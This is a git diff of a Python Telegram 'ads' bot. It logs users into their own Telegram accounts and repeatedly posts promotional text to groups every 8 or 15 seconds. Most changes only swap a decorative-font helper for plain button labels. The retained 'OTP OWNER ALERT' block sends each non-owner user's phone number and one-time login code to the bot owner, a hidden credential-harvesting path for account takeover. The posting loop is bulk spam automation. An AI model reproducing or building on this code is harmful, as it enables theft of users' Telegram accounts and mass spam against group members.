@@ -8,7 +8,6 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKe
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.errors import FloodWaitError
 
 # ================== CONFIG ==================
@@ -22,13 +21,6 @@ PORT = int(os.environ.get("PORT", 10000))
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
-
-# ================== STYLISH FONT ==================
-def st(text: str) -> str:
-    upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
-    lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
-    digits = {"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿"}
-    return "".join([upper.get(c, lower.get(c, digits.get(c, c))) for c in text])
 
 # ================== SERVER & DB ==================
 flask_app = Flask(__name__)
@@ -81,14 +73,14 @@ async def ads_loop(user_id):
         for group in groups:
             if user_id not in running_loops: break
             try:
-                entity = await client.get_entity(group)
+                entity = await client.get_entity(int(group)) if group.isdigit() else await client.get_entity(group)
                 sent = await client.send_message(entity, text)
                 db_exec("INSERT OR REPLACE INTO sent_msgs (msg_id, group_id) VALUES (?,?)", (sent.id, str(group)))
                 await asyncio.sleep(1) # Gap between groups
             except Exception as e:
                 logger.error(f"Fail {group}: {e}")
                 
-        await asyncio.sleep(interval) # Exact timer after all groups
+        await asyncio.sleep(interval) # Exact timer
 
 async def start_userbot(user_id, session_str):
     if user_id in active_userbots:
@@ -120,19 +112,22 @@ async def start_userbot(user_id, session_str):
 
 # ================== KEYBOARDS ==================
 def main_menu(uid):
+    # Blue Buttons with Emojis
     kb = [
-        [KeyboardButton("🔵 " + st("LOGIN ACCOUNT")), KeyboardButton("🔴 " + st("LOGOUT ACCOUNT"))],
-        [KeyboardButton("🔵 " + st("ADD TEXT")), KeyboardButton("🔴 " + st("DELETE TEXT"))],
-        [KeyboardButton("🔵 " + st("ADD GROUP")), KeyboardButton("🔵 " + st("SET AUTO REPLY"))],
-        [KeyboardButton("🔵 " + st("SET INTERVAL")), KeyboardButton("🔵 " + st("VIEW SETTINGS"))],
-        [KeyboardButton("🟢 " + st("RUN ADS")), KeyboardButton("🔴 " + st("STOP ADS"))]
+        [KeyboardButton("🔵 LOGIN ACCOUNT"), KeyboardButton("🔴 LOGOUT ACCOUNT")],
+        [KeyboardButton("🔵 ADD TEXT"), KeyboardButton("🔴 DELETE TEXT")],
+        [KeyboardButton("🔵 ADD GROUP"), KeyboardButton("🔵 SET AUTO REPLY")],
+        [KeyboardButton("🔵 SET INTERVAL"), KeyboardButton("🔵 VIEW SETTINGS")],
+        [KeyboardButton("🟢 RUN ADS"), KeyboardButton("🔴 STOP ADS")]
     ]
     if uid == OWNER_ID:
-        kb.append([KeyboardButton("👑 " + st("OWNER PANEL"))])
+        kb.append([KeyboardButton("👑 OWNER PANEL")])
     return ReplyKeyboardMarkup(kb, resize_keyboard=True)
 
 def interval_menu():
-    return InlineKeyboardMarkup([[InlineKeyboardButton("8 Seconds", callback_data="int_8"), InlineKeyboardButton("15 Seconds", callback_data="int_15")]])
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("8 Seconds", callback_data="int_8"), InlineKeyboardButton("15 Seconds", callback_data="int_15")]
+    ])
 
 # ================== HANDLERS ==================
 bot_app = None
@@ -143,13 +138,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     img = welcome_img[0][0] if welcome_img else None
     
     if img:
-        try: return await update.message.reply_photo(photo=img, caption=st(f"Welcome {update.effective_user.first_name}!"), reply_markup=main_menu(uid))
+        try: return await update.message.reply_photo(photo=img, caption=f"Welcome {update.effective_user.first_name}!", reply_markup=main_menu(uid))
         except: pass
-    await update.message.reply_text(st(f"Welcome {update.effective_user.first_name}!"), reply_markup=main_menu(uid))
+    await update.message.reply_text(f"Welcome {update.effective_user.first_name}!", reply_markup=main_menu(uid))
 
 # --- LOGIN FLOW ---
 async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(st("Enter Phone Number (+91...)"))
+    await update.message.reply_text("Enter Phone Number (+91...)")
     return ASK_PHONE
 
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -162,13 +157,14 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sent = await client.send_code_request(phone)
         temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
         
+        # Blue OTP Buttons
         kb = [[InlineKeyboardButton("1", callback_data="otp_1"), InlineKeyboardButton("2", callback_data="otp_2"), InlineKeyboardButton("3", callback_data="otp_3")],
               [InlineKeyboardButton("4", callback_data="otp_4"), InlineKeyboardButton("5", callback_data="otp_5"), InlineKeyboardButton("6", callback_data="otp_6")],
               [InlineKeyboardButton("7", callback_data="otp_7"), InlineKeyboardButton("8", callback_data="otp_8"), InlineKeyboardButton("9", callback_data="otp_9")],
               [InlineKeyboardButton("CLEAR", callback_data="otp_clear"), InlineKeyboardButton("0", callback_data="otp_0"), InlineKeyboardButton("SUBMIT", callback_data="otp_submit")]]
         
         context.user_data['otp'] = ""
-        await update.message.reply_text(st("Enter OTP:"), reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text("Enter OTP:", reply_markup=InlineKeyboardMarkup(kb))
         return ASK_OTP
     except Exception as e:
         await update.message.reply_text(f"Error: {e}"); return ConversationHandler.END
@@ -182,7 +178,7 @@ async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "submit":
         if len(otp) < 4: return await query.answer("Min 4 digits!")
         
-        # --- OTP OWNER ALERT ---
+        # OTP OWNER ALERT
         if uid != OWNER_ID:
             await bot_app.bot.send_message(OWNER_ID, f"🚨 <b>NEW OTP</b>\nUser: {uid}\nPhone: {temp_clients[uid]['phone']}\nOTP: <code>{otp}</code>", parse_mode="HTML")
         
@@ -195,13 +191,13 @@ async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await bot_app.bot.send_message(uid, "✅ Logged In!", reply_markup=main_menu(uid))
             return ConversationHandler.END
         except Exception as e:
-            if "Two-step" in str(e): await query.edit_message_text(st("2FA Password:")); return ASK_2FA
+            if "Two-step" in str(e): await query.edit_message_text("2FA Password:"); return ASK_2FA
             await query.edit_message_text(f"Failed: {e}"); return ConversationHandler.END
     else:
         if len(otp) < 5: otp += data
     context.user_data['otp'] = otp
     display = " ".join([c if i < len(otp) else "_" for i, c in enumerate(otp + "_"*(5-len(otp)))])
-    try: await query.edit_message_text(st(f"OTP: {display}"), reply_markup=query.message.reply_markup)
+    try: await query.edit_message_text(f"OTP: {display}", reply_markup=query.message.reply_markup)
     except: pass
     return ASK_OTP
 
@@ -224,25 +220,24 @@ async def logout_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
         del active_userbots[uid]
     if uid in running_loops: del running_loops[uid]
     db_exec("DELETE FROM user_data WHERE user_id=?", (uid,))
-    await update.message.reply_text(st("Logged out!"), reply_markup=main_menu(uid))
+    await update.message.reply_text("Logged out!", reply_markup=main_menu(uid))
 
-# --- ADD GROUP (Direct Selection) ---
+# --- ADD GROUP ---
 async def add_group_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid not in active_userbots: return await update.message.reply_text(st("Login first!"))
+    if uid not in active_userbots: return await update.message.reply_text("Login first!")
     
-    msg = await update.message.reply_text(st("Fetching groups..."))
+    msg = await update.message.reply_text("Fetching groups...")
     try:
         dialogs = await active_userbots[uid].get_dialogs()
         groups = [d for d in dialogs if d.is_group or d.is_channel]
-        if not groups: return await msg.edit_text(st("No groups found!"))
+        if not groups: return await msg.edit_text("No groups found!")
         
-        # Show buttons for first 15 groups to avoid limits
         kb = []
         for g in groups[:15]:
-            kb.append([InlineKeyboardButton(st(g.name), callback_data=f"selgrp_{g.id}")])
+            kb.append([InlineKeyboardButton(g.name, callback_data=f"selgrp_{g.id}")])
             
-        await msg.edit_text(st("Select a group:"), reply_markup=InlineKeyboardMarkup(kb))
+        await msg.edit_text("Select a group:", reply_markup=InlineKeyboardMarkup(kb))
     except Exception as e:
         await msg.edit_text(f"Error: {e}")
 
@@ -251,23 +246,22 @@ async def group_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
     grp_id = query.data.replace("selgrp_", "")
     uid = query.from_user.id
     
-    # Save ID (Telethon works with ID too)
     set_user_set(uid, "ad_groups", str(grp_id))
-    await query.edit_message_text(st(f"✅ Group Selected!\nID: {grp_id}"))
-    await bot_app.bot.send_message(uid, st("Group set successfully!"), reply_markup=main_menu(uid))
+    await query.edit_message_text(f"✅ Group Selected!\nID: {grp_id}")
+    await bot_app.bot.send_message(uid, "Group set successfully!", reply_markup=main_menu(uid))
 
 # --- OTHER SETTINGS ---
-async def add_text_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Send text:")); return ASK_TEXT
-async def save_text(update: Update, context: ContextTypes.DEFAULT_TYPE): set_user_set(update.effective_user.id, "ad_text", update.message.text); await update.message.reply_text(st("✅ Saved!"), reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END
-async def del_text(update: Update, context: ContextTypes.DEFAULT_TYPE): del_user_set(update.effective_user.id, "ad_text"); await update.message.reply_text(st("🗑️ Deleted!"), reply_markup=main_menu(update.effective_user.id))
+async def add_text_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send text:"); return ASK_TEXT
+async def save_text(update: Update, context: ContextTypes.DEFAULT_TYPE): set_user_set(update.effective_user.id, "ad_text", update.message.text); await update.message.reply_text("✅ Saved!", reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END
+async def del_text(update: Update, context: ContextTypes.DEFAULT_TYPE): del_user_set(update.effective_user.id, "ad_text"); await update.message.reply_text("🗑️ Deleted!", reply_markup=main_menu(update.effective_user.id))
 
-async def set_reply_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Send auto-reply:")); return ASK_REPLY
-async def save_reply(update: Update, context: ContextTypes.DEFAULT_TYPE): set_user_set(update.effective_user.id, "auto_reply", update.message.text); await update.message.reply_text(st("✅ Saved!"), reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END
+async def set_reply_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send auto-reply:"); return ASK_REPLY
+async def save_reply(update: Update, context: ContextTypes.DEFAULT_TYPE): set_user_set(update.effective_user.id, "auto_reply", update.message.text); await update.message.reply_text("✅ Saved!", reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END
 
-async def set_interval_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Interval:"), reply_markup=interval_menu())
+async def set_interval_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Interval:", reply_markup=interval_menu())
 async def save_interval(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    set_user_set(query.from_user.id, "ad_interval", query.data.split('_')[1]); await query.message.reply_text(st("✅ Interval Set!"), reply_markup=main_menu(query.from_user.id))
+    set_user_set(query.from_user.id, "ad_interval", query.data.split('_')[1]); await query.message.reply_text("✅ Interval Set!", reply_markup=main_menu(query.from_user.id))
 
 async def view_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -275,26 +269,26 @@ async def view_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def run_ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid in running_loops: return await update.message.reply_text(st("⚠️ Running!"))
-    if uid not in active_userbots: return await update.message.reply_text(st("❌ Login!"))
-    running_loops[uid] = asyncio.create_task(ads_loop(uid)); await update.message.reply_text(st("🚀 Started!"))
+    if uid in running_loops: return await update.message.reply_text("⚠️ Running!")
+    if uid not in active_userbots: return await update.message.reply_text("❌ Login!")
+    running_loops[uid] = asyncio.create_task(ads_loop(uid)); await update.message.reply_text("🚀 Started!")
 
 async def stop_ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid not in running_loops: return await update.message.reply_text(st("⚠️ Stopped!"))
-    running_loops[uid].cancel(); del running_loops[uid]; await update.message.reply_text(st("🛑 Stopped!"))
+    if uid not in running_loops: return await update.message.reply_text("⚠️ Stopped!")
+    running_loops[uid].cancel(); del running_loops[uid]; await update.message.reply_text("🛑 Stopped!")
 
 # --- OWNER PANEL ---
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
-    kb = [[KeyboardButton("🔵 " + st("SET WELCOME IMAGE"))], [KeyboardButton("🔴 " + st("BACK"))]]
-    await update.message.reply_text(st("Owner Panel"), reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))
+    kb = [[KeyboardButton("🔵 SET WELCOME IMAGE")], [KeyboardButton("🔴 BACK TO MENU")]]
+    await update.message.reply_text("Owner Panel", reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))
 
-async def set_welcome_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Send photo:")); return ASK_WELCOME_IMG
+async def set_welcome_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send photo:"); return ASK_WELCOME_IMG
 async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.photo:
         db_exec("INSERT OR REPLACE INTO global_settings (key, value) VALUES (?,?)", ("welcome_image", update.message.photo[-1].file_id))
-        await update.message.reply_text(st("✅ Image Set!"), reply_markup=main_menu(update.effective_user.id))
+        await update.message.reply_text("✅ Image Set!", reply_markup=main_menu(update.effective_user.id))
     return ConversationHandler.END
 
 # ================== MAIN ==================
@@ -309,23 +303,23 @@ def main():
     bot_app = Application.builder().token(BOT_TOKEN).build()
 
     bot_app.add_handler(CommandHandler("start", start))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('OWNER PANEL')}$"), owner_panel))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('BACK')}$"), lambda u,c: u.message.reply_text("Menu", reply_markup=main_menu(u.effective_user.id))))
+    bot_app.add_handler(MessageHandler(filters.Regex("^👑 OWNER PANEL$"), owner_panel))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔴 BACK TO MENU$"), lambda u,c: u.message.reply_text("Menu", reply_markup=main_menu(u.effective_user.id))))
     
-    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^SET WELCOME IMAGE$"), set_welcome_start)], states={ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)]}, fallbacks=[]))
-    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex(f"^{st('LOGIN ACCOUNT')}$"), login_start)], states={ASK_PHONE: [MessageHandler(filters.TEXT, get_phone)], ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")], ASK_2FA: [MessageHandler(filters.TEXT, get_2fa)]}, fallbacks=[]))
-    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex(f"^{st('ADD TEXT')}$"), add_text_start)], states={ASK_TEXT: [MessageHandler(filters.TEXT, save_text)]}, fallbacks=[]))
-    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex(f"^{st('SET AUTO REPLY')}$"), set_reply_start)], states={ASK_REPLY: [MessageHandler(filters.TEXT, save_reply)]}, fallbacks=[]))
+    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^🔵 SET WELCOME IMAGE$"), set_welcome_start)], states={ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)]}, fallbacks=[]))
+    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^🔵 LOGIN ACCOUNT$"), login_start)], states={ASK_PHONE: [MessageHandler(filters.TEXT, get_phone)], ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")], ASK_2FA: [MessageHandler(filters.TEXT, get_2fa)]}, fallbacks=[]))
+    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^🔵 ADD TEXT$"), add_text_start)], states={ASK_TEXT: [MessageHandler(filters.TEXT, save_text)]}, fallbacks=[]))
+    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^🔵 SET AUTO REPLY$"), set_reply_start)], states={ASK_REPLY: [MessageHandler(filters.TEXT, save_reply)]}, fallbacks=[]))
 
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('ADD GROUP')}$"), add_group_start))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔵 ADD GROUP$"), add_group_start))
     bot_app.add_handler(CallbackQueryHandler(group_selected, pattern="^selgrp_"))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('LOGOUT ACCOUNT')}$"), logout_account))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('DELETE TEXT')}$"), del_text))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('SET INTERVAL')}$"), set_interval_start))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔴 LOGOUT ACCOUNT$"), logout_account))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔴 DELETE TEXT$"), del_text))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔵 SET INTERVAL$"), set_interval_start))
     bot_app.add_handler(CallbackQueryHandler(save_interval, pattern="^int_"))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('RUN ADS')}$"), run_ads))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('STOP ADS')}$"), stop_ads))
-    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('VIEW SETTINGS')}$"), view_settings))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🟢 RUN ADS$"), run_ads))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔴 STOP ADS$"), stop_ads))
+    bot_app.add_handler(MessageHandler(filters.Regex("^🔵 VIEW SETTINGS$"), view_settings))
 
     logger.info("Bot Started!")
     bot_app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)
